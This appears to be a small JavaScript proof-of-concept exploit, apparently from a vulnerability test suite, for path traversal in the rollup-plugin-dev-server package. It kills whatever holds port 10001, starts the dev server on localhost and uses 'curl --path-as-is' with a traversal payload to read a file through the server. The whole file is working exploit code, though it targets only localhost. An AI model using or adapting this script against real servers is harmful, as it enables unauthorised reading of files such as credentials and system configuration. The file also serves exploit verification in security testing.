function exploitFunction(payload) {
  const server = require("rollup-plugin-dev-server");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(payload()).toString();

  try {
    exec("fuser -k 10001/tcp", () => {});
  } catch (e) {}

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:10001${payload()}"`;
  server({
    host: "localhost",
    port: 10001,
  });

  return new Promise((resolve) => {
    exec(attack_string, (error, stdout) => {
      resolve(stdout);
    });
  });
}

module.exports = { exploitFunction };